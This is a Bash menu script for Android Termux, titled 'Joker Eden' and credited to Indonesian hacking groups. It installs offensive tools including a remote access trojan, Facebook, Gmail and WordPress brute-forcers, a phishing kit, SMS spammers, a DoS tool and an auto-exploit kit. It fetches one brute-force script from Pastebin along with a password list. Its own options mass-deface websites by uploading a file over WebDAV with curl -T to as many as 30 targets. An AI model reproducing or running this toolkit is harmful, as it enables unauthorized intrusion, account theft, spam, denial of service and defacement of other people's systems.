#!/system/xbin/bash
#Tools From IndonesiaPeople
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
echo $indigo"      NO!"$purple"                          MNO!   "
echo $indigo"     MNO!!"$white"         [EXP]"$purple"          MNNOO!    "
echo $indigo"   MMNO!"$purple"                           MNNOO!! "
echo $indigo"  MNOONNOO!"$white"   MMMMMMMMMM"$indigo"PPPOII!"$purple"   MNNO!!!!  "
echo $indigo" !O! NNO!"$white" MMMMMMMMMMMMM"$indigo"PPPOOOII!!"$purple" NO!       "
echo $purple"       ! MMMMMMMMMMMMM"$indigo"PPPPOOOOIII! !       "
echo $purple"        MMMMMMMMMMMM"$indigo"PPPPPOOOOOOII!!       "
echo $purple"        MMMMMOOOOOO"$indigo"PPPPPPPPOOOOMII!       "
echo $purple"        MMMMM..    OPP"$indigo"MMP    .,OMI!       "
echo $purple"        MMMM::"$white"   o.,"$indigo"OP"$indigo"MP"$indigo",.o"$indigo"   ::I!!"
echo $purple"          NNM:::.,,OOPM!P"$indigo",.::::!!         "
echo $purple"         MMNNNNNOOOOPMO"$indigo"!!IIPPO!!O!        "
echo $purple"         MMMMMNNNNOO"$indigo":!!:!!IPPPPOO!        "
echo $purple"          MMMMMNNOOMMNN"$indigo"IIIPPPOO!!         "
echo $purple"             MMMONNMMNNN"$indigo"IIIOO!                "
echo $indigo"           MN"$white" MOMMMNNN"$indigo"IIIIIO!"$purple" OO          "
echo $indigo"          MNO! "$white"iiiiii"$indigo"iiiiiI"$purple" OOOO         "
echo $indigo"     NNN.MNO!   "$white"O"$yellow"!!!!!!!!!"$indigo"O"$purple"   OONO NO!    "
echo $indigo"    MNNNNNO!    "$white"OOOOO"$indigo"OOOOOO"$purple"    MMNNON!    "
echo $indigo"      MNNNNO!    "$white"PPP"$indigo"PPPPPP"$purple"    MMNON!      "
echo $indigo"         OO!"$purple"                   ON!        "
echo $yellow
toilet -f standard --gay "Joker Eden"
echo "[ Author : Codename | Homepage: www.nostalgiaxploit.wordpress.com ]"
echo "[ ??? Tools Installers | Versi : Full Version ]"
echo "[ Greetz : Indonesia Security LITE - GhostHunterIllusion - DarknessCyberTeam ]"
echo ""
echo $yellow "[Menu List Tools]"
echo  "[+]-------------------------------------[+]"
echo $yellow "Y) About Author"
echo  "[+]-------------------------------------[+]"
echo $yellow "A) A-Rat"
echo  "[+]-------------------------------------[+]"
echo $yellow "B) Ngrok"
echo  "[+]-------------------------------------[+]"
echo $yellow "C) D-TECT"
echo  "[+]-------------------------------------[+]"
echo $yellow "D) Admin-Finder"
echo  "[+]-------------------------------------[+]"
echo $yellow "E) Hash-Buster"
echo  "[+]-------------------------------------[+]"
echo $yellow "F) CMSmap"
echo  "[+]-------------------------------------[+]"
echo $yellow "G) WPBruteForce"
echo  "[+]-------------------------------------[+]"
echo $red "H) weeman"
echo  "[+]-------------------------------------[+]"
echo $red "I) Facebook Bruteforce"
echo  "[+]-------------------------------------[+]"
echo $red "J) instabot.py"
echo  "[+]-------------------------------------[+]"
echo $red "K) BruteforceFacebook"
echo  "[+]-------------------------------------[+]"
echo $red "L) JD.ID Spam SMS From Indonesia"
echo  "[+]-------------------------------------[+]"
echo $red "N) LITESPAM Spam SMS From Indonesia"
echo  "[+]-------------------------------------[+]"
echo $red "O) Youtube DL"
echo  "[+]-------------------------------------[+]"
echo $red "P) Hammer"
echo  "[+]-------------------------------------[+]"
echo $yellow "Q) pemulungBTC"
echo  "[+]-------------------------------------[+]"
echo $yellow "R) Gmail Bruteforce"
echo  "[+]-------------------------------------[+]"
echo $yellow "S) Deface webdav"
echo  "[+]-------------------------------------[+]"
echo $yellow "T) Deface webdav 30target"
echo  "[+]-------------------------------------[+]"
echo $yellow "U) Curi Script"
echo  "[+]-------------------------------------[+]"
echo $yellow "V) OSIF (Open Source Information Facebook)"
echo  "[+]-------------------------------------[+]"
echo $yellow "W) Bing-grab"
echo  "[+]-------------------------------------[+]"
echo $yellow "X) Auto-Exploit-Werehosue-All-Modules"
echo  "[+]-------------------------------------[+]"
echo $red "Z) Quit"
echo  "[+]-------------------------------------[+]"
read -p "root@Joker ~#" code

if [ $code = "A" ] || [ $code = "A" ]
then
echo " installing A-Rat "
sleep 1
apt-get update && apt-get upgrade
apt-get install python2 && apt-get install git
git clone https://github.com/Xi4u7/A-Rat.git
mv A-Rat/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "B" ] || [ $code = "b" ]
then
echo " Installing Ngrok "
sleep 1
apt-get update && apt-get upgrade
apt-get install wget
mkdir ngrok
cd ~/ngrok
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
cd ~/
fi

if [ $code = "C" ] || [ $code = "c" ]
then
echo " Installing D-TECT "
sleep 1
apt-get update && apt-get upgrade
apt-get install git && apt-get install python2
git clone https://github.com/shawarkhanethicalhacker/D-TECT.git
mv D-TECT/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "D" ] || [ $code = "D" ]
then
echo " Installing Admin-Finder "
sleep 1
apt-get update && apt-get upgrade
apt-get install git && apt-get install python2
git clone https://github.com/the-c0d3r/admin-finder.git
mv admin-finder/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "E" ] || [ $code = "e" ]
then
echo "Installing Hash-Buster"
sleep 1
apt-get update && apt-get upgrade
apt-get install git && apt-get install python2
git clone https://github.com/UltimateHackers/Hash-Buster.git
mv Hash-Buster/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "F" ] || [ $code = "f" ]
then
echo " Installing CMSmap "
sleep 1
apt-get update && apt-get upgrade
apt-get install git && apt-get install python2
git clone https://github.com/Dionach/CMSmap.git
mv CMSmap/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "G" ] || [ $code = "g" ]
then
echo " Installing Wordpress Bruteforce "
sleep 1
apt-get update && apt-get upgrade
apt-get install git && apt-get install python && apt install python2
pip install request
git clone https://github.com/atarantini/wpbf.git
mv wpbf/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "H" ] || [ $code = "h" ]
then
echo " Installing weeman "
sleep 1
apt-get update && apt-get upgrade
apt-get install git && apt-get install python2
git clone https://github.com/evait-security/weeman.git
mv weeman/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "I" ] || [ $code = "i" ]
then
echo " Installing Facebook Bruteforce "
sleep 1
apt-get update && apt-get upgrade
apt-get install git && apt-get install python2
pip2 install requests && pip2 install machanize
git clone https://github.com/verluchie/fbbrute.git
mv fbbrute/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "J" ] || [ $code = "j" ]
then
echo " Installing instabot.py "
sleep 1
apt-get update && apt-get upgrade
apt-get install git && apt-get install python2
pip2 install requests && pip2 install machanize
git clone https://github.com/verluchie/instabot.py
mv instabot.py/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "K" ] || [ $code = "k" ]
then
echo " Installing BruteforceFacebook "
sleep 1
apt-get update && apt-get upgrade
apt-get install python2 && apt-get install python2-dev
apt-get install wget && pip2 install mechanize && pip2 install requests
mkdir fbbrute
cd ~/fbbrute
wget https://pastebin.com/raw/aqMBt2xA -O fbbrute.py
wget http://override.waper.co/files/password.apk
mv password.apk password.txt
chmod 777 fbbrute.py
cd ~/
mv fbbrute.py/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "L" ] || [ $code = "l" ]
then
echo " Installing Spam JD.ID Shop Online "
sleep 1
apt-get update && apt-get upgrade
apt-get install git && apt-get install php
git clone https://github.com/ilhamhax0r/JD.ID-Spam-Code.git
mv JD.ID-Spam-Code/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "N" ] || [ $code = "n" ]
then
echo " Installing LITESPAM "
sleep 1
apt-get update && apt-get upgrade
apt-get install php && apt-get install toilet
apt-get install figlet && apt-get install ruby
gem install lolcat && apt-get install git
git clone https://github.com/4L13199/LITESPAM.git
mv LITESPAM/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "O" ] || [ $code = "o" ]
then
echo " Installing Youtube DL "
sleep 1
apt update && apt upgrade
apt install python
pip3 install mps_youtube
pip3 install youtube_dl
apt install mpv
echo "Untuk menjalankannya ketik "mpsyt" tanpa tanda petik"
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "P" ] || [ $code = "p" ]
then
echo " Installing hammer "
sleep 1
apt-get update && apt-get upgrade 
apt-get install git && apt-get install python2
git clone https://github.com/cyweb/hammer.git
mv hammer/ $HOME
echo "Usage : python2 hammer.py -s<ip> -p<port> -t<turbo>"
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "Q" ] || [ $code = "Q" ]
then
echo " Installing Bot Auto Collection Bitcoin "
sleep 1
apt update && apt upgrade
apt install git && apt install php
git clone https://github.com/BitMake/pemulungBTC.git
mv pemulungBTC/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "R" ] || [ $code = "r" ]
then
echo " Installing Gmail Bruteforce "
sleep 1
apt update && apt upgrade 
apt install git && apt install python2
git clone https://github.com/JamesAndresCM/Brute_force_gmail
echo " Usage: python2.7 brute_force_gmail.py example@gmail.com PATH_TO_DICTIONARY "
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "S" ] || [ $code = "s" ]
then
echo " Note : Save Script In Memory Internal "
sleep 1
echo "Masukkan Target !!!"
read -p "root@DefaceWebdav ~#" target
echo "Masukkan script !!!"
read -p "root@DefaceWebdav ~#" script
curl -T /storage/emulated/0/$script $target
echo $red"[+]>>>>> $target/$script"
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "T" ] || [ $code = "t" ]
then
echo " Note : Save Script Deface In Memory Internal "
sleep 1
echo "Masukkan Script !!!"
read -p "root@Bruteforce" script
echo "Masukkan Target1 !!!"
read -p "root@Bruteforce" target1
curl -T /storage/emulated/0/$script $target1
echo "Masukkan Target2 !!!"
read -p "root@Bruteforce" target2
curl -T /storage/emulated/0/$script $target2
echo "Masukkan Target3 !!!"
read -p "root@Bruteforce" target3
curl -T /storage/emulated/0/$script $target3
echo "Masukkan Target4 !!!"
read -p "root@Bruteforce" target4
curl -T /storage/emulated/0/$script $target4
echo "Masukkan Target5 !!!"
read -p "root@Bruteforce" target5
curl -T /storage/emulated/0/$script $target5
echo "Masukkan Target6 !!!"
read -p "root@Bruteforce" target6
curl -T /storage/emulated/0/$script $target6
echo "Masukkan Target7 !!!"
read -p "root@Bruteforce" target7
curl -T /storage/emulated/0/$script $target7
echo "Masukkan Target8 !!!"
read -p "root@Bruteforce" target8
curl -T /storage/emulated/0/$script $target8
echo "Masukkan Target9 !!!"
read -p "root@Bruteforce" target9
curl -T /storage/emulated/0/$script $target9
echo "Masukkan Target10 !!!"
read -p "root@Bruteforce" target10
curl -T /storage/emulated/0/$script $target10
echo "Masukkan Target11 !!!"
read -p "root@Bruteforce" target11
curl -T /storage/emulated/0/$script $target11
echo "Masukkan Target12 !!!"
read -p "root@Bruteforce" target12
curl -T /storage/emulated/0/$script $target12
echo "Masukkan Target13 !!!"
read -p "root@Bruteforce" target13
curl -T /storage/emulated/0/$script $target13
echo "Masukkan Target14 !!!"
read -p "root@Bruteforce" target14
curl -T /storage/emulated/0/$script $target14
echo "Masukkan Target15 !!!"
read -p "root@Bruteforce" target15
curl -T /storage/emulated/0/$script $target15
echo "Masukkan Target16 !!!"
read -p "root@Bruteforce" target16
curl -T /storage/emulated/0/$script $target16
echo "Masukkan Target17 !!!"
read -p "root@Bruteforce" target17
curl -T /storage/emulated/0/$script $target17
echo "Masukkan Target18 !!!"
read -p "root@Bruteforce" target18
curl -T /storage/emulated/0/$script $target18
echo "Masukkan Target19 !!!"
read -p "root@Bruteforce" target19
curl -T /storage/emulated/0/$script $target19
echo "Masukkan Target20 !!!"
read -p "root@Bruteforce" target20
curl -T /storage/emulated/0/$script $target20
echo "Masukkan Target21 !!!"
read -p "root@Bruteforce" target21
curl -T /storage/emulated/0/$script $target21
echo "Masukkan Target22 !!!"
read -p "root@Bruteforce" target22
curl -T /storage/emulated/0/$script $target22
echo "Masukkan Target23 !!!"
read -p "root@Bruteforce" target23
curl -T /storage/emulated/0/$script $target23
echo "Masukkan Target24 !!!"
read -p "root@Bruteforce" target24
curl -T /storage/emulated/0/$script $target24
echo "Masukkan Target25 !!!"
read -p "root@Bruteforce" target25
curl -T /storage/emulated/0/$script $target25
echo "Masukkan Target26 !!!"
read -p "root@Bruteforce" target26
curl -T /storage/emulated/0/$script $target26
echo "Masukkan Target27 !!!"
read -p "root@Bruteforce" target27
curl -T /storage/emulated/0/$script $target27
echo "Masukkan Target28 !!!"
read -p "root@Bruteforce" target28
curl -T /storage/emulated/0/$script $target28
echo "Masukkan Target29 !!!"
read -p "root@Bruteforce" target29
curl -T /storage/emulated/0/$script $target29
echo "Masukkan Target30 !!!"
read -p "root@Bruteforce" target30
curl -T /storage/emulated/0/$script $target30
echo "############### Done ###############"
echo $red"[+]>>>>> $target1/$script"
echo $red"[+]>>>>> $target2/$script"
echo $red"[+]>>>>> $target3/$script"
echo $red"[+]>>>>> $target4/$script"
echo $red"[+]>>>>> $target5/$script"
echo $red"[+]>>>>> $target6/$script"
echo $red"[+]>>>>> $target7/$script"
echo $red"[+]>>>>> $target8/$script"
echo $red"[+]>>>>> $target9/$script"
echo $red"[+]>>>>> $target10/$script"
echo $red"[+]>>>>> $target11/$script"
echo $red"[+]>>>>> $target12/$script"
echo $red"[+]>>>>> $target13/$script"
echo $red"[+]>>>>> $target14/$script"
echo $red"[+]>>>>> $target15/$script"
echo "\033[35;1m[+]>>>>> $target16/$script"
echo "\033[35;1m[+]>>>>> $target17/$script"
echo "\033[35;1m[+]>>>>> $target18/$script"
echo "\033[35;1m[+]>>>>> $target19/$script"
echo "\033[35;1m[+]>>>>> $target20/$script"
echo "\033[35;1m[+]>>>>> $target21/$script"
echo "\033[35;1m[+]>>>>> $target22/$script"
echo "\033[35;1m[+]>>>>> $target23/$script"
echo "\033[35;1m[+]>>>>> $target24/$script"
echo "\033[35;1m[+]>>>>> $target25/$script"
echo "\033[35;1m[+]>>>>> $target26/$script"
echo "\033[35;1m[+]>>>>> $target27/$script"
echo "\033[35;1m[+]>>>>> $target28/$script"
echo "\033[35;1m[+]>>>>> $target29/$script"
echo "\033[35;1m[+]>>>>> $target30/$script"
echo "############### Done ###############"
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "U" ] || [ $code = "u" ]
then
echo "Source Code"
sleep 1
echo "Masukkan Target !!!"
read -p "root@SourceCode" target
echo "Simpan Ext : html (script.html) !!!"
read -p "root@SourceCode" simpan
curl -o $simpan $target
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "V" ] || [ $code = "v" ]
then
echo " Installing OSIF (Open Source Information Facebook)"
sleep 1
apt update && apt upgrade
apt install git && apt install python2
git clone https://github.com/ciku370/OSIF
cd ~/OSIF
pip2 install -r requirements.txt
cd ~/
mv OSIF/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "W" ] || [ $code = "w" ]
then
echo " Installing Bing Grab "
sleep 1
apt update && apt upgrade
apt install git 
https://github.com/ZerobyteDotID/Bing-grab
mv Bing-grab/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "X" ] || [ $code = "x" ]
then
echo " Installing Auto-Exploit-Werehosue-All-Modules "
sleep 1
apt update && apt upgrade
apt install git 
git clone https://github.com/ZerobyteDotID/Auto-Exploit-Werehosue-All-Modules
mv Auto-Exploit-Werehosue-All-Modules/ $HOME
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "Y" ] || [ $code = "y" ]
then
echo $red "################# INFO ####################"
echo $indigo " Author : Codename "
echo $indigo " Github : https://github.com/nishinosukasa "
echo $indigo " Blog   : https://cruznos.blogspot.com "
echo $indigo " Website: https://nostalgiaxploit.wordpress.com "
echo $indigo " Versi  : V.1 "
echo $indigo "        Thanks To "
echo $indigo " Google.com || Youtube.com || Pastebin.com "
echo $indigo " Blogger.com || Wordpress.com || Github.com "
echo $indigo "        Special Thanks "
echo $indigo " Eden Tercinta || ZerobyteDotID || IndoXploit "
echo $indigo " Indonesia Security Lite || Blackhole Security "
echo $red "################# INFO ####################"
echo "[B]Back / [Q]Quit"
read -p "[B]/[Q]" back
fi

if [ $code = "Z" ] || [ $code = "z" ]
then
echo $red "Sampai Bertemu Kembali :)"
exit
fi


if [ $back = "B" ] || [ $back = "b" ]
then
sh Joker.sh
fi

if [ $back = "Q" ] || [ $back = "q" ]
then
clear
fi